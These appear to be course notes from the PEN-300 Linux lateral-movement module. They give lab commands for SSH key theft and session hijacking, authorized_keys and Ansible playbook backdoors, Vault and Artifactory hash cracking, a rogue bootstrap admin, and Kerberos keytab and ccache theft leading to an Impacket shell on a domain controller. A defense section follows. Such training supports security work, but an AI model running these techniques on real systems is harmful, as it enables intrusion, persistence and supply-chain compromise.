PEN-300 Module 18 — Linux Lateral Movement (SSH, DevOps: Ansible & Artifactory, Kerberos on Linux)

Fuente: material del curso correspondiente (sin video público)

Objective

Pivot through Linux hosts after initial compromise. Linux runs much of an organization's web/database/infrastructure layer, so lateral movement must cover it just as thoroughly as Windows. The module walks three families of technique:

  1. SSH — steal private keys (and crack their passphrases offline), hijack live sessions via ControlMaster and ssh-agent forwarding, plant persistence in authorized_keys.
  2. DevOps — abuse large-scale automation tooling: Ansible (controller compromise, ad-hoc commands, playbook backdooring, Vault cracking, syslog credential leakage) and Artifactory (binary repository compromise → supply-chain pivot).
  3. Kerberos on Linux — domain-joined Linux hosts as a bridge into Windows/AD: keytab theft, ccache theft, and Impacket attacks from Kali through a pivoted SOCKS proxy.

Not every technique needs root, but — as with Windows lateral movement — most do.

Target surface

Kali /etc/hosts mappings used throughout the module (lab IPs verbatim):

Host IP
controller 192.168.120.40
linuxvictim 192.168.120.45
dc01.corp1.com 192.168.120.5

Roles: linuxvictim is a node/domain-joined member of corp1.com; controller is the Ansible controller and the Artifactory server; dc01 is the AD domain controller. All credential values encountered (SSH passphrases, Vault secrets, MySQL/Artifactory/AD passwords, bcrypt hashes) are redacted throughout this writeup.

Techniques

1. Stealing SSH private keys

Private keys are prime targets: they grant access to every machine that accepts the key, not just the current host. Keys normally live in ~/.ssh/ and are chmod 600, but users copy them elsewhere or rename them.

  • Even without root, check for weak-permission keys — find /home/ -name "id_rsa" (default name only; Permission denied per line means unreadable).
  • With root, browse other users' home dirs. Lab: /home/linuxvictim/svuser.key (-rw-------) sits in the home directory, not in .ssh/.

Determine where a stolen key is accepted:

  • svuser doesn't exist in /etc/passwd on this host → the key is for another machine.
  • ~/.ssh/known_hosts is often useless: HashKnownHosts in /etc/ssh/ssh_config hashes entries (|1|mi1rx...|... ecdsa-sha2-nistp256 ...).
  • ~/.bash_history pays off — it shows ssh -i ./svuser.key svuser@controller. Resolve the host with host controller → 192.168.120.40.

2. Detecting and cracking key passphrases

Don't test the key against the SSH client — a failed attempt can trigger logs/alerts. Inspect the file instead:

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,351CBB3ECC54B554DD07029E2C377380

Proc-Type: 4,ENCRYPTED + a DEK-Info header = passphrase-protected. No headers = unencrypted, usable as-is.

The passphrase check happens client-side, so cracking is fully offline. Convert with ssh2john, then JTR (Hashcat works too and can use the GPU):

python /usr/share/john/ssh2john.py svuser.key > svuser.hash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash

Usage requires chmod 600 on the private key. Prefer connecting from the compromised host (linuxvictim) rather than Kali directly to avoid alerting: ssh -i ./svuser.key svuser@controller → shell as svuser.

3. SSH persistence via authorized_keys

Insert your public key into a target user's ~/.ssh/authorized_keys for passwordless re-entry. With write access just append a line (normal path is ssh-copy-id, which requires authentication); authorized_keys must be 644, so usually only the owner or root can write it.

# on Kali
ssh-keygen                                   # ~/.ssh/id_rsa + id_rsa.pub
# on the victim, as the user or root
echo "ssh-rsa AAAA... kali@kali" >> /home/linuxvictim/.ssh/authorized_keys
# back on Kali
ssh linuxvictim@linuxvictim                  # no password

4. SSH hijacking with ControlMaster

Conceptually similar to taking over an existing RDP session on Windows: reuse an established SSH connection instead of authenticating. ControlMaster multiplexes sessions over one connection, configured per-user in ~/.ssh/config (or system-wide in /etc/ssh/ssh_config):

Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m
  • ControlPath — socket location, named <user>@<host>:<port>; the directory must exist (mkdir ~/.ssh/controlmaster); chmod 644 ~/.ssh/config.
  • ControlMaster auto — reuse existing sockets, else open a new connection.
  • ControlPersist — yes keeps sockets open indefinitely; a duration (10m here) keeps them accept-bound after the last session closes. MaxSessions (default 10) caps concurrent multiplexed sessions.

Scenario A — same unprivileged user. We control offsec on the controller. A legitimate offsec session to linuxvictim creates the socket srw------- offsec@linuxvictim:22. We simply run ssh offsec@linuxvictim — piggybacked, no password.

Scenario B — root. Root can point the SSH client at another user's socket with -S:

ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim

Both scenarios require an open victim connection to exist.

5. SSH hijacking with agent forwarding

ssh-agent keeps decrypted private keys in memory so passphrases aren't retyped. Agent forwarding lets key challenges from a remote destination be passed back through an intermediate host to the origin client's agent — the private key never lands on the intermediate and the passphrase is typed once. Legit setup: keypair with passphrase on the origin, ssh-copy-id the pubkey to both intermediate and destination, ForwardAgent yes in the client's ~/.ssh/config, AllowAgentForwarding yes in the intermediate's /etc/ssh/sshd_config.

Unprivileged attacker: log in as the compromised user on the intermediate server and run ssh offsec@linuxvictim — the forwarded agent answers the challenge. Unlike ControlMaster, this works against any host the victim's key can reach, not just ones with existing downstream connections. Still requires the victim to have an active session.

Root attacker — avoid logging in as the victim (fewer log artifacts). The agent exposes a UNIX socket; read it out of the victim's live shell process environment:

ps aux | grep ssh            # find "sshd: offsec@pts/N"
pstree -p offsec | grep ssh  # sshd(16380)---bash(16381)
cat /proc/16381/environ      # ... SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380

Then reuse the socket directly:

SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l     # confirm the key
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh offsec@linuxvictim

6. Ansible — enumeration and ad-hoc commands

Ansible is a push-model configuration manager: a controller connects to inventory nodes, ships Python modules to them, executes them, deletes the artifacts, and collects results. The controller account typically has root/sudo on every node — compromising the controller (or its SSH key) compromises the whole inventory at once.

  • Inventory: /etc/ansible/hosts (lab: group [victims] → linuxvictim).
  • Enumerate: is ansible installed (run it bare for usage output), /etc/ansible/ exists, "ansible"-named users in /etc/passwd, ansible home folders, ansible messages in syslog.
  • Ad-hoc commands across the whole group: ansible victims -a "whoami"; add --become to run as root (default) or another user on the nodes.

7. Ansible playbooks, credential theft, and Vault cracking

Playbooks are YAML: name, hosts, gather_facts (facts fill {{ ansible_hostname }}-style variables), and tasks invoking modules; become: yes elevates.

Credential-hunting ladder:

  • Root / ansible-admin on the controller → run arbitrary playbooks on all nodes (elevated), or steal the controller's SSH private key — often passphrase-less, since automation can't type passphrases.
  • Read access to playbooks → admins sometimes hardcode node credentials, e.g. vars: with ansible_become_pass: <redacted>. Playbooks aren't always restricted to admin+root.
  • Ansible Vault encrypts secrets inline:

yaml ansible_become_pass: !vault | $ANSIBLE_VAULT;1.1;AES256 ...

Crack it offline: copy the $ANSIBLE_VAULT... block (no leading whitespace) into a file, then

bash python3 /usr/share/john/ansible2john.py test.yml # → $ansible$0*0*... hash hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt cat pw.txt | ansible-vault decrypt # recover the original secret

8. Backdooring writable playbooks

A playbook writable by us (directly, or via group membership — lab: getinfowritable.yaml is writable by group ansible, and our bystander foothold is in that group) executes with whatever privileges the playbook has, on every host it targets. Inject tasks that preserve the original functionality and add ours with become: yes:

- name: ensure /root/.ssh exists
  file: path=/root/.ssh state=directory mode=0700
- name: ensure authorized_keys exists
  file: path=/root/.ssh/authorized_keys state=touch mode=0600
- name: add our key
  lineinfile: dest=/root/.ssh/authorized_keys line="ssh-rsa AAAA... kali@kali"

Next time the admin runs the playbook, our key lands in root's authorized_keys on every managed host → passwordless ssh root@linuxvictim.

For arbitrary command execution, remember Ansible tasks are idempotent modules — to run shell commands, insert a shell: task, made fire-and-forget with async: 10 + poll: 0 so the playbook completes without waiting on our payload:

- name: demo
  shell: touch /tmp/mycreatedfile.txt
  async: 10
  poll: 0

Re-run → root-owned artifact on linuxvictim. Alternatives: SSH in with our own root key, or make the injected task return a reverse shell.

9. Ansible leaking credentials to syslog

Some modules (notably shell) log their full module parameters to /var/log/syslog on the managed node when parameters aren't fixed — unless the task sets no_log: true. The classic bad pattern: an admin embeds plaintext DB credentials in a frequently-run backup playbook because the playbook itself is admin/root-only readable:

mysql --user=root --password=<REDACTED> --host=databaseserver --databases tpsreports

Attack: read /var/log/syslog on the managed node — the Invoked with ... _raw_params=mysql --user=root --password=... --host=... line leaks username, password, and DB host → pivot to the database server. Recon tip: grep password /var/log/syslog.

10. Artifactory — the supply-chain target

Artifactory (JFrog) is a binary repository manager — "single source of truth" for packages/binaries that producers upload and consumers/automation pull. Compromise one server or one write-access account and every downstream user becomes a victim via a trusted source. Alternatives with the same attack surface: Apache Archiva, Sonatype Nexus, CloudRepo, Cloudsmith.

  • Enumerate on-host: ps aux | grep artifactory; externally: web UI, default external port 8081 (lab runs it at http://controller:8082/), installed under /opt/jfrog/artifactory, started with sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start.
  • Repos are typed (Gradle/Ivy/Maven/SBT/Generic in open source); the lab has generic-local. "Set Me Up" reveals the curl upload/download usage per artifact; artifact metadata shows download path, deployer, timestamps, and download count.
  • Simply replacing binaries on disk doesn't work: the filestore (/opt/jfrog/artifactory/var/data/artifactory/filestore/<2-char>/<hash>) stores content by SHA hash with integrity checks. Attack the credentials or the database instead.

11. Cracking Artifactory users from backups and the DB

Users/passwords live in a database — commercial editions use Postgres; the open-source default is the bundled Apache Derby.

Via backups (root, no app credentials needed). Open-source Artifactory writes DB backups as JSON under <ARTIFACTORY_FOLDER>/var/backup/access/ (access.backup.<timestamp>.json) containing full user records: password: bcrypt$$2a$... hashes, allowedIps, status. Note admin was restricted to ALLOWED_IPS 127.0.0.1 while developer was unrestricted. Copy hashes to Kali and crack offline:

sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Directly from the DB (no usable backups). Derby locks the database while running — removing locks in place risks corruption, so copy it elsewhere first:

mkdir /tmp/hackeddb
sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb/
sudo chmod 755 /tmp/hackeddb -R
sudo rm /tmp/hackeddb/derby/*.lck          # remove lock files on the copy

Query the copy with Derby's ij tool, driven by Artifactory's bundled Java (the default Derby DB has no username/password — it's protected by file permissions alone, so root suffices):

sudo /opt/jfrog/artifactory/app/third-party/java/bin/java \
    -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
ij> connect 'jdbc:derby:/tmp/hackeddb/derby';
ij> select * from access_users;

Rows expose username, bcrypt hash, allowed IPs, status → crack offline (Hashcat/John). With a working login, modify hosted binaries: when a user updates their software, Artifactory serves our backdoored artifact — one compromise, many victims. (Third-party DBs like Postgres may not lock files, in which case direct user-record injection into a live DB is also possible.)

12. Artifactory admin backdoor via bootstrap.creds

Artifactory ships a built-in recovery mechanism: a bootstrap credentials file processed at startup. Requirements: write access to /opt/jfrog/artifactory/var/etc/access + ability to chmod (root/sudo) + an Artifactory restart (downtime/data-corruption risk — weigh against the engagement).

echo 'haxmin@*=<REDACTED>' | sudo tee /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
# file format: <newuser>@*=<password>   ("*" = allow connections from any IP)
sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start

Verify in /opt/jfrog/artifactory/var/log/console.log — expect [ACCESS BOOTSTRAP] Create admin user 'haxmin'. Log in as the new admin → same binary-tampering pivot as above.

13. Kerberos on Linux — how domain-joined hosts use it

Linux can use a Linux KDC or AD directly. In the lab, linuxvictim is joined to corp1.com; AD users log in with domain credentials (e.g. ssh administrator@corp1.com@linuxvictim). Client-side tooling:

  • Credential cache (ccache) location in KRB5CCNAME (env | grep KRB5CCNAME), typically FILE:/tmp/krb5cc_<uid>_<rand>.
  • kinit (enter the AD password) → TGT; klist → list cached tickets; kdestroy → drop them.
  • Enumerate SPNs over LDAP, letting the password prompt fall through to Kerberos:

bash ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com \ -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*"

Yields TERMSRV/ldap/DNS service tickets and MSSQLSvc/DC01.corp1.com:1433, appsrv01, etc. - Request a service ticket and check it landed: kvno MSSQLSvc/DC01.corp1.com:1433 → ticket in ccache → MSSQL access as that user.

14. Stealing keytab files

A keytab holds a Kerberos principal's keys so scripts (commonly in cron) authenticate passwordlessly. Recon: read /etc/crontab, follow the referenced scripts to find keytab paths and their associated users. Creation (for the lab, as the domain admin) via ktutil: addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac, wkt /tmp/administrator.keytab.

Attack: with root (or any read access — weak permissions are sometimes set for sharing):

kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab   # TGT → our ccache
kinit -R                                                        # renew a renewable expired TGT, no password
smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$   # domain-admin action: C$ listed

15. Stealing ccache files

Two scenarios: (1) compromise an active user's session and use their current tickets directly; (2) steal the ccache file itself. Ccaches live at /tmp/krb5cc_<uid>_<rand> mode 600 — usually need root/privileged read. Identify the victim's by owner (ls -al /tmp/krb5cc_* shows e.g. administrator@corp1.com domain users@corp1.com).

sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
sudo chown offsec:offsec /tmp/krb5cc_minenow
kdestroy
export KRB5CCNAME=/tmp/krb5cc_minenow
klist                                  # Administrator@CORP1.COM TGT + ldap + MSSQL tickets
kvno MSSQLSvc/DC01.corp1.com:1433      # request new service tickets as the domain admin

16. Impacket from Kali through a Kerberized pivot

Kerberos validates the source IP, so tickets stolen on the domain-joined linuxvictim must be used from linuxvictim — pivot with an SSH SOCKS proxy and proxychains (comment out proxy_dns in /etc/proxychains.conf to avoid DNS conflicts):

scp stolen-ccache kali:                # move the ccache to Kali
ssh offsec@linuxvictim -D 9050         # SOCKS proxy through the domain-joined host
export KRB5CCNAME=/path/to/ccache
sudo apt install krb5-user             # realm corp1.com

Name resolution matters — /etc/hosts: 192.168.120.5 CORP1.COM DC01.CORP1.COM (DC; get its IP with host corp1.com from linuxvictim), plus 192.168.120.40 controller and 192.168.120.45 linuxvictim. Then, all through proxychains with Impacket (/usr/share/doc/python3-impacket/):

proxychains python3 GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
proxychains python3 GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
proxychains python3 psexec.py Administrator@DC01.CORP1.COM -k -no-pass

GetADUsers dumps the domain user list; GetUserSPNs reveals service accounts (lab: sqlsvc with MSSQL SPNs on appsrv01/dc01 — and sqlsvc was in the local Administrators group); psexec.py with -k -no-pass Kerberizes, uploads a service binary, creates and starts the service → SYSTEM shell on the domain controller.

Extra mile (cross-platform pass-the-ticket): a Windows 10 client logged in as domain admin holds the TGT in memory → reverse shell → export the ticket (kirbi) to Kali → convert kirbi→ccache → with the network firewalled to simulate segmentation, pass the ticket to the DC and pivot through the Windows client.

Detection & defense

  • SSH key hygiene: hunt for stray keys (find / -name "id_rsa", home-directory copies like svuser.key) in your own estate; enforce passphrases and assume they'll be cracked — passphrase strength is the only barrier once a key is stolen (ssh2john/JTR). HashKnownHosts blunts known_hosts recon; .bash_history will still betray connection targets.
  • ControlMaster/agent forwarding: both hijacks require an existing victim session. Restrict AllowAgentForwarding (and disable it by default in sshd_config); avoid ControlPersist yes; monitor for ~/.ssh/controlmaster socket directories appearing for users who never configured them — the course's attack starts by writing that config into a victim's home. Root's /proc/<pid>/environ socket reuse leaves no SSH login as the victim — watch for root sessions reading other users' process environments.
  • authorized_keys backdoors: file must stay 644 and owned correctly; audit authorized_keys changes (new keys appended are the classic persistence), consider AIDE/tripwire-style monitoring of ~/.ssh.
  • Ansible: lock down the controller host and its key (it is root-on-every-node by design); restrict playbook read access — hardcoded vars credentials and Vault-protected secrets both fall to offline cracking (ansible2john → hashcat mode 16900); playbook write access on any group-writable file is code execution as root on all inventory hosts; set no_log: true on tasks handling secrets, and treat /var/log/syslog as credential-bearing (the module's grep-password recon works on any unhardened node).
  • Artifactory: restrict read access to /var/backup/access (JSON backups leak bcrypt hashes for offline cracking) and /var/data/access/derby; file permissions are the only protection on the embedded Derby DB; disable or tightly control the bootstrap.creds recovery path (root + restart required, but it silently creates an any-IP admin); above all — repository managers are trusted distribution points, so compromise there propagates to every consumer. Monitor artifact deploy/replace events.
  • Kerberos on Linux: inventory cron jobs and scripts for keytab files and lock their permissions (600, owner-only — the attack needed only read access); ccaches in /tmp are mode-600 but root-readable, and any foothold with sudo can copy, chown, and export one; remember tickets are source-IP-bound, so SSH SOCKS pivots are the attacker's workaround — egress filtering and monitoring proxychains-style traffic from Linux hosts toward the DC (GetADUsers/GetUserSPNs/psexec all arrived over one SOCKS channel) is the detection lever.

Exercises (from the module)

  • Generate a passphrase-protected keypair and crack it with JTR; plant your public key in authorized_keys on linuxvictim.
  • Ad-hoc Ansible command; reverse-shell playbook; inject a shell: task into getinfowritable.yaml for a Meterpreter shell.
  • Copy the Artifactory DB, extract and crack hashes; deploy a backdoored binary and trigger a user download; add a bootstrap.creds admin.
  • Create a keytab as domain admin and steal it as root; steal the admin ccache and use it; enumerate SPNs with Impacket and get a DC shell.
